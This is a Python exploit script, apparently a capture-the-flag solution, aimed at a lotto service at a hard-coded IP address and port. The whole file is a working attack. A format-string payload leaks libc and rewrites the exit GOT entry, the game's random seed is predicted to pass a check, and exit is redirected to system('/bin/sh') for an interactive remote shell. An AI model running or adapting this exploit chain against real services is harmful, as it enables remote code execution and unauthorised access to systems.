#!/usr/bin/python
import struct
import socket
import telnetlib
import ctypes

libc = ctypes.cdll.LoadLibrary("libc.so.6")

def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('175.119.158.135', 8909))
f = s.makefile('rw', bufsize=0)

def make_fmt_str(writes, addr_offset=0, print_offset=0):
    fmt = ''
    if addr_offset % 4 != 0:
        pad = 4 - addr_offset % 4
        fmt += 'A' * pad
        addr_offset += pad
        print_offset += pad

    addr_idx = 17 + addr_offset / 4

    for a, _ in writes:
        fmt += p(a)
        print_offset += 4
    assert '\0' not in fmt
    assert '\n' not in fmt

    for _, v in writes:
        delta = (v - print_offset) & 0xffff
        if delta < 16:
            fmt += 'A' * delta
        else:
            fmt += '%' + str(delta) + 'u'
        fmt += '%' + str(addr_idx) + '$hn'
        addr_idx += 1
        print_offset = v
    assert '\0' not in fmt
    assert '\n' not in fmt

    return fmt

def play(f, fmt, clobbered=False):
    readuntil(f, '? ')
    f.write(fmt.ljust(100, 'A'))

    data = readuntil(f, '==> ')
    idx = len('\nHello~ ') + 100
    seed = u(data[idx:idx+4])
    print 'seed:', hex(seed)

    libc.srand(seed)

    lotto = []
    while len(lotto) < 6:
        num = libc.rand() % 45 + 1
        if num not in lotto:
            lotto.append(num)

    f.write(' '.join(map(str, lotto)) + '\n')

    if not clobbered:
        return readuntil(f, 'You Win!!\n')

exit_got = 0x804A024
main = 0x0804878C

# 17 is Bs
# 47 is libc

fmt = '|%47$08x|'

writes = []
writes.append((exit_got, main & 0xffff))
writes.append((exit_got+2, main >> 16))

fmt += make_fmt_str(writes, addr_offset=len(fmt), print_offset=10)

data = play(f, fmt)
libc_addr = int(data.split('|')[1], 16)
libc_base = libc_addr - 0x1873e
print 'libc_base =', hex(libc_base)
system = libc_base + 0x0003b180
binsh = libc_base + 0x15f61b
add_4c_ret = libc_base + 0x7b465

writes = []
writes.append((exit_got, add_4c_ret & 0xffff))
writes.append((exit_got+2, add_4c_ret >> 16))

fmt = 'BBBB'
fmt += p(system)
fmt += 'BBBB'
fmt += p(binsh)
fmt += make_fmt_str(writes, addr_offset=len(fmt), print_offset=len(fmt))
raw_input()
play(f, fmt, clobbered=True)

t = telnetlib.Telnet()
t.sock = s
t.interact()
